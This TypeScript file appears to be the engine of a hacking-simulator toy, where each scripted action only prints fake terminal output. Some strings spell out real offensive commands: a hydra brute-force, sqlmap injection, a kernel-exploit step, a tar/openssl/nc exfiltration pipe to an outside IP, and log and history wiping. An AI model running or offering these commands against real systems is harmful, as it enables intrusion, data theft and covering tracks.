// The fake hacking machine: what each action prints and how it changes the
// pretend system. Everything here is theatre; nothing touches a network.

export type Sys = {
  connected: boolean;
  host: string; // current (or last scanned) target
  ip: string;
  root: boolean;
  encrypted: boolean; // the target vault, shown in the cipher and hex panes
  firewall: boolean; // target firewall up
  proxies: number; // hops between us and the target, slows the trace
  trace: number; // 0..100, at 100 they find us and the link drops
  alert: number; // 0..100, how noisy we've been
  loot: number; // MB exfiltrated
  load: number; // 0..1, drives the traffic graph
};

export type Cls = "cmd" | "ok" | "err" | "warn" | "dim" | "hi" | "";
export type Flash = "granted" | "denied" | "alert" | "wiped" | "boom";
// One step of a script: print a line, animate a progress bar, and/or change state.
export type Step = {
  t?: string;
  c?: Cls;
  d?: number; // ms to wait before this step
  bar?: string; // progress bar label
  ms?: number; // progress bar duration
  set?: Partial<Sys>;
  flash?: Flash;
  say?: string; // robot screen + spoken
};

export type Action = { id: string; label: string; words: string[]; needs?: "link"; run: (s: Sys) => Step[] };

const rnd = (a: number, b: number) => a + Math.floor(Math.random() * (b - a + 1));
export const pick = <T,>(a: ArrayLike<T>): T => a[Math.floor(Math.random() * a.length)];
export const hex = (n: number) => Array.from({ length: n }, () => pick("0123456789abcdef")).join("");
export const ip = () => `${rnd(11, 223)}.${rnd(0, 255)}.${rnd(0, 255)}.${rnd(1, 254)}`;
const clamp = (v: number) => Math.max(0, Math.min(100, v));
const stamp = () => new Date().toISOString().replace("T", " ").slice(0, 19);

// Fictional targets.
export const HOSTS = [
  "mainframe.nexus-corp.net",
  "vault-07.helix-bank.io",
  "db-prod-03.omnicorp.internal",
  "sat-uplink.orbital-9.net",
  "core.zeroday-labs.org",
  "gw-01.blackice-systems.com",
  "archive.ministry-of-data.gov.zz",
];
const USERS = ["admin", "root", "svc_backup", "jenkins", "oracle", "postgres", "sysop"];
const PASSWORDS = ["123456", "password", "letmein", "qwerty123", "admin2024", "dragon", "P@ssw0rd!", "trustno1", "hunter2", "iloveyou"];
const DBS = ["users", "payments", "classified", "employees", "blackbudget", "satellite_keys"];

export const initial = (): Sys => ({
  connected: false,
  host: pick(HOSTS),
  ip: ip(),
  root: false,
  encrypted: true,
  firewall: true,
  proxies: 0,
  trace: 0,
  alert: 0,
  loot: 0,
  load: 0.1,
});

const noLink: Step[] = [
  { t: "error: no active session", c: "err", d: 150 },
  { t: "hint: run CONNECT first", c: "dim" },
  { flash: "denied" },
];

export const ACTIONS: Action[] = [
  {
    id: "connect",
    label: "CONNECT",
    words: ["connect", "ssh", "login"],
    run: (s) => {
      const host = s.connected ? s.host : pick(HOSTS);
      const addr = ip();
      if (s.firewall && Math.random() < 0.3)
        return [
          { t: `$ ssh -o StrictHostKeyChecking=no root@${addr}`, c: "cmd" },
          { t: `ssh: connect to host ${addr} port 22: Connection refused`, c: "err", d: 900 },
          { t: "firewall dropped the handshake. try BYPASS", c: "warn" },
          { flash: "denied", set: { alert: clamp(s.alert + 8), host, ip: addr } },
        ];
      return [
        { t: `$ ssh -o StrictHostKeyChecking=no root@${addr}`, c: "cmd", set: { host, ip: addr, load: 0.4 } },
        { t: `Warning: Permanently added '${addr}' (ED25519) to the list of known hosts.`, c: "dim", d: 500 },
        { t: `root@${addr}'s password: ************`, d: 600 },
        { bar: "negotiating aes256-gcm@openssh.com", ms: 900 },
        { t: "Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)", d: 200 },
        { t: ` * ${host}  [${rnd(3, 64)} cores, ${rnd(64, 512)} GB RAM]`, c: "dim" },
        { t: `Last login: ${stamp()} from ${ip()}`, c: "dim" },
        { t: `CONNECTED -> ${host}`, c: "ok", set: { connected: true, trace: 0, load: 0.25 }, flash: "granted", say: "ACCESS GRANTED" },
      ];
    },
  },
  {
    id: "disconnect",
    label: "DISCONNECT",
    words: ["disconnect", "exit", "logout", "quit"],
    run: (s) =>
      s.connected
        ? [
            { t: "$ logout", c: "cmd" },
            { t: `Connection to ${s.ip} closed.`, d: 400 },
            { t: "session scrubbed. link down.", c: "dim", set: { connected: false, root: false, trace: 0, load: 0.1 }, say: "OFFLINE" },
          ]
        : [{ t: "$ logout", c: "cmd" }, { t: "not connected", c: "dim" }],
  },
  {
    id: "scan",
    label: "SCAN",
    words: ["scan", "nmap"],
    run: (s) => {
      const host = s.connected ? s.host : pick(HOSTS);
      const addr = s.connected ? s.ip : ip();
      return [
        { t: `$ nmap -sS -sV -T4 -Pn ${host}`, c: "cmd", set: { host, ip: addr, load: 0.6 } },
        { t: `Starting Nmap 7.94SVN ( https://nmap.org ) at ${stamp()}`, d: 300 },
        { bar: "SYN Stealth Scan", ms: 1600 },
        { t: `Nmap scan report for ${host} (${addr})` },
        { t: `Host is up (0.0${rnd(11, 89)}s latency).` },
        { t: `Not shown: ${rnd(990, 996)} closed tcp ports (reset)`, c: "dim" },
        { t: "PORT     STATE    SERVICE  VERSION", c: "hi" },
        { t: "22/tcp   open     ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.6", d: 120 },
        { t: "80/tcp   open     http     nginx 1.18.0 (Ubuntu)", d: 120 },
        { t: "443/tcp  open     ssl/http nginx 1.18.0", d: 120 },
        { t: `3306/tcp ${s.firewall ? "filtered" : "open    "} mysql    MySQL 8.0.36`, c: s.firewall ? "warn" : "ok", d: 120 },
        { t: "8080/tcp open     http     Apache Tomcat 9.0.65", d: 120 },
        { t: `Nmap done: 1 IP address (1 host up) scanned in ${rnd(3, 9)}.${rnd(10, 99)} seconds`, set: { alert: clamp(s.alert + 5), load: 0.25 } },
      ];
    },
  },
  {
    id: "brute",
    label: "BRUTEFORCE",
    words: ["brute", "bruteforce", "hydra", "crack"],
    run: (s) => {
      const user = pick(USERS);
      const pass = pick(PASSWORDS);
      const tries: Step[] = Array.from({ length: 9 }, () => ({
        t: `[ATTEMPT] target ${s.ip} - login "${pick(USERS)}" - pass "${pick(PASSWORDS)}" - ${rnd(1, 14344)} of 14344399`,
        c: "dim" as Cls,
        d: 90,
      }));
      return [
        { t: `$ hydra -l ${user} -P rockyou.txt -t 16 ssh://${s.ip}`, c: "cmd", set: { load: 0.8 } },
        { t: "Hydra v9.5 (c) 2023 by van Hauser/THC - for legal purposes only", d: 300 },
        { t: "[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)" },
        { t: `[DATA] attacking ssh://${s.ip}:22/` },
        ...tries,
        { t: `[STATUS] ${rnd(900, 2400)}.00 tries/min, ${rnd(4000, 9000)} tries in 00:0${rnd(2, 5)}h`, c: "warn" },
        ...tries.slice(0, 4),
        { t: `[22][ssh] host: ${s.ip}   login: ${user}   password: ${pass}`, c: "ok", d: 300 },
        { t: "1 of 1 target successfully completed, 1 valid password found", flash: "granted", say: "CRACKED", set: { alert: clamp(s.alert + 12), load: 0.25 } },
      ];
    },
  },
  {
    id: "bypass",
    label: "BYPASS",
    words: ["bypass", "firewall", "iptables"],
    run: (s) =>
      !s.firewall
        ? [{ t: "$ ./fw_bypass --probe", c: "cmd" }, { t: "firewall already down", c: "dim" }]
        : [
            { t: `$ ./fw_bypass --frag --mtu 8 --decoy RND:12 ${s.ip}`, c: "cmd", set: { load: 0.7 } },
            { t: "[*] fingerprinting perimeter: Fortinet FortiGate 7.2", d: 500 },
            { t: "[*] fragmenting packets (MTU 8) and spoofing 12 decoys" },
            { bar: "evading IDS signatures", ms: 1500 },
            { t: "[*] ACL rule 0x2f bypassed via TTL desync", c: "warn" },
            { t: "[+] FIREWALL DOWN", c: "ok", set: { firewall: false, alert: clamp(s.alert + 10), load: 0.25 }, flash: "granted", say: "FIREWALL DOWN" },
          ],
  },
  {
    id: "escalate",
    label: "ESCALATE",
    words: ["escalate", "sudo", "root", "privesc"],
    needs: "link",
    run: (s) =>
      s.root
        ? [{ t: "$ id", c: "cmd" }, { t: "uid=0(root) gid=0(root) groups=0(root)", c: "ok" }]
        : [
            { t: "$ id", c: "cmd" },
            { t: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", d: 200 },
            { t: "$ find / -perm -4000 -type f 2>/dev/null", c: "cmd", d: 400 },
            { t: "/usr/bin/pkexec\n/usr/bin/sudo\n/usr/lib/openssh/ssh-keysign", c: "dim", d: 300 },
            { t: "$ gcc -o pwn kernel_exploit.c && ./pwn", c: "cmd", d: 400 },
            { bar: "overwriting cred struct", ms: 1300 },
            { t: "$ id", c: "cmd" },
            { t: "uid=0(root) gid=0(root) groups=0(root)", c: "ok", set: { root: true, alert: clamp(s.alert + 8) }, flash: "granted", say: "I AM ROOT" },
          ],
  },
  {
    id: "inject",
    label: "INJECT",
    words: ["inject", "sqlmap", "sqli"],
    run: (s) => [
      { t: `$ sqlmap -u "https://${s.host}/item.php?id=1" --batch --dbs`, c: "cmd", set: { load: 0.6 } },
      { t: "        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.8.2#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|", c: "hi", d: 200 },
      { t: `[*] starting @ ${stamp().slice(11)}`, d: 300 },
      { t: "[INFO] testing connection to the target URL", d: 300 },
      { t: "[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'", d: 400 },
      { t: "[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable", c: "warn", d: 600 },
      { t: "[INFO] the back-end DBMS is MySQL", d: 300 },
      { t: `available databases [${DBS.length}]:`, c: "ok", d: 300 },
      ...DBS.map((d) => ({ t: `[*] ${d}`, d: 80 })),
      { t: "payload injected", c: "ok", set: { alert: clamp(s.alert + 10), load: 0.25 }, flash: "granted", say: "INJECTED" },
    ],
  },
  {
    id: "encrypt",
    label: "ENCRYPT",
    words: ["encrypt", "lock", "openssl"],
    run: (s) => [
      { t: "$ openssl enc -aes-256-cbc -salt -pbkdf2 -iter 600000 -in vault.db -out vault.db.enc", c: "cmd", set: { load: 0.5 } },
      { t: "enter AES-256-CBC encryption password: ****************", d: 400 },
      { bar: "encrypting vault.db (2.4 GB)", ms: 1700 },
      { t: `$ sha256sum vault.db.enc`, c: "cmd" },
      { t: `${hex(64)}  vault.db.enc`, c: "dim" },
      { t: "$ shred -u vault.db", c: "cmd" },
      { t: "vault locked. key held in /dev/shm only.", c: "ok", set: { encrypted: true, load: 0.2 }, say: "LOCKED" },
    ],
  },
  {
    id: "decrypt",
    label: "DECRYPT",
    words: ["decrypt", "unlock", "hashcat"],
    run: (s) =>
      !s.encrypted
        ? [{ t: "$ file vault.db", c: "cmd" }, { t: "vault.db: SQLite 3.x database, already plaintext", c: "dim" }]
        : [
            { t: "$ hashcat -m 1800 -a 0 -w 4 shadow.hash rockyou.txt", c: "cmd", set: { load: 0.95 } },
            { t: "hashcat (v6.2.6) starting", d: 300 },
            { t: "CUDA API (CUDA 12.4)\n* Device #1: NVIDIA GeForce RTX 4090, 23867/24563 MB, 128MCU", c: "dim" },
            { t: "Session..........: hashcat\nStatus...........: Running\nHash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))", d: 400 },
            { t: `Speed.#1.........: ${rnd(1100, 2900)}.${rnd(1, 9)} kH/s (${rnd(40, 90)}.${rnd(1, 9)}ms) @ Accel:512 Loops:256`, c: "warn" },
            { bar: "Progress", ms: 2200 },
            { t: "Status...........: Cracked", c: "ok" },
            { t: `$6$${hex(8)}$${hex(22)}...:${pick(PASSWORDS)}`, c: "hi" },
            { t: "$ openssl enc -d -aes-256-cbc -pbkdf2 -in vault.db.enc -out vault.db", c: "cmd" },
            { bar: "decrypting", ms: 900 },
            { t: "DECRYPTED. vault.db is readable.", c: "ok", set: { encrypted: false, load: 0.25 }, flash: "granted", say: "DECRYPTED" },
          ],
  },
  {
    id: "exfil",
    label: "EXFILTRATE",
    words: ["exfil", "exfiltrate", "download", "steal"],
    needs: "link",
    run: (s) => {
      const mb = rnd(300, 4800);
      return [
        { t: `$ tar czf - /var/lib/mysql/${pick(DBS)} | openssl enc -aes-256-ctr -pass env:K | nc -q0 ${ip()} 443`, c: "cmd", set: { load: 1 } },
        { t: `[*] streaming ${mb} MB over covert TLS channel`, d: 300 },
        { bar: `exfiltrating ${mb} MB`, ms: 2600 },
        { t: `[+] ${mb} MB received, sha256 verified`, c: "ok", set: { loot: s.loot + mb, alert: clamp(s.alert + 18), load: 0.3 }, flash: "granted", say: "GOT IT" },
      ];
    },
  },
  {
    id: "trace",
    label: "TRACEROUTE",
    words: ["trace", "traceroute", "route"],
    run: (s) => {
      let ms = 1;
      const hops = Array.from({ length: rnd(7, 11) }, (_, i) => {
        ms += rnd(2, 30);
        const a = ip();
        return { t: `${String(i + 1).padStart(2)}  ${a}  ${ms}.${rnd(100, 999)} ms  ${ms + 1}.${rnd(100, 999)} ms  ${ms}.${rnd(100, 999)} ms`, d: 220 } as Step;
      });
      return [
        { t: `$ traceroute -n ${s.host}`, c: "cmd", set: { load: 0.4 } },
        { t: `traceroute to ${s.host} (${s.ip}), 30 hops max, 60 byte packets`, d: 200 },
        ...hops,
        { t: `${String(hops.length + 1).padStart(2)}  ${s.ip}  ${ms + 4}.${rnd(100, 999)} ms`, c: "ok", d: 300, set: { load: 0.2 } },
      ];
    },
  },
  {
    id: "proxy",
    label: "PROXY CHAIN",
    words: ["proxy", "proxychains", "tor", "vpn"],
    run: (s) => {
      const add = Math.min(3, 9 - s.proxies);
      if (!add) return [{ t: "$ proxychains -q true", c: "cmd" }, { t: "proxy chain at max depth (9 hops)", c: "dim" }];
      const hops: Step[] = Array.from({ length: add }, () => ({ t: `[proxychains] Strict chain  ...  ${ip()}:${pick(["9050", "1080", "3128", "8118"])}  ...  OK`, c: "ok", d: 450 }));
      return [
        { t: "$ proxychains4 -f /etc/proxychains.conf -q bash", c: "cmd" },
        { t: "[proxychains] config file found: /etc/proxychains.conf", c: "dim", d: 200 },
        { t: "[proxychains] DLL init: proxychains-ng 4.17", c: "dim" },
        ...hops,
        { t: `chain depth ${s.proxies + add}. trace slowed.`, c: "hi", set: { proxies: s.proxies + add }, say: "GHOST MODE" },
      ];
    },
  },
  {
    id: "wipe",
    label: "WIPE LOGS",
    words: ["wipe", "shred", "clean", "logs"],
    needs: "link",
    run: (s) => [
      { t: "$ shred -zu -n 7 /var/log/auth.log /var/log/syslog ~/.bash_history", c: "cmd" },
      { bar: "overwriting 7 passes", ms: 1300 },
      { t: "$ history -c && unset HISTFILE && touch -r /etc/passwd /var/log", c: "cmd" },
      { t: "tracks covered.", c: "ok", set: { trace: Math.max(0, s.trace - 45), alert: Math.max(0, s.alert - 35) }, flash: "wiped", say: "NO TRACE" },
    ],
  },
  {
    id: "botnet",
    label: "BOTNET",
    words: ["botnet", "ddos", "flood", "overload"],
    run: (s) => [
      { t: `$ ./c2 --swarm 4096 --target ${s.ip} --vector udp,syn,http2`, c: "cmd", set: { load: 1 } },
      { t: "[c2] waking bots: 1024... 2048... 4096 online", c: "warn", d: 600 },
      { bar: "saturating uplink", ms: 2000 },
      { t: `[c2] ${rnd(180, 900)} Gbps sustained. ${s.host} is not responding`, c: "err" },
      { t: "[c2] swarm recalled", c: "dim", set: { alert: clamp(s.alert + 25), load: 0.3 }, flash: "alert", say: "OVERLOAD" },
    ],
  },
  {
    id: "panic",
    label: "SELF-DESTRUCT",
    words: ["panic", "selfdestruct", "self-destruct", "nuke", "burn"],
    run: () => [
      { t: "$ ./burn_everything.sh --no-preserve-evidence", c: "err" },
      { t: "!! SELF-DESTRUCT ARMED !!", c: "err", flash: "alert", say: "3 2 1" },
      { t: "3...", c: "err", d: 800 },
      { t: "2...", c: "err", d: 800 },
      { t: "1...", c: "err", d: 800 },
      { t: "", flash: "boom", d: 300, set: initial() },
      { t: "all sessions burned. identity rotated. machine clean.", c: "ok", d: 1200 },
    ],
  },
];

// The trace caught up with us.
export const busted = (s: Sys): Step[] => [
  { t: `!! TRACE COMPLETE: ${s.host} security has your location !!`, c: "err", flash: "alert", say: "BUSTED" },
  { t: `Connection to ${s.ip} closed by remote host.`, c: "err", d: 600, set: { connected: false, root: false, trace: 0, alert: 100 } },
  { t: "tip: PROXY CHAIN slows a trace, WIPE LOGS rolls it back", c: "dim" },
];

export function find(text: string): Action | undefined {
  const w = text.trim().toLowerCase().split(/\s+/)[0];
  return ACTIONS.find((a) => a.id === w || a.words.includes(w));
}

// What an action does right now: refused without a link, otherwise its script.
export function stepsFor(a: Action, s: Sys): Step[] {
  return a.needs === "link" && !s.connected ? noLink : a.run(s);
}

// How much the trace grows per second while connected.
export const traceRate = (s: Sys) => Math.max(0.4, 3.2 - s.proxies * 0.33) * (0.5 + s.alert / 80);

export const HELP = [
  "commands:",
  ...ACTIONS.map((a) => `  ${a.words[0].padEnd(12)} ${a.label}`),
  "  clear        wipe the screen",
  "  whoami       who you are",
];
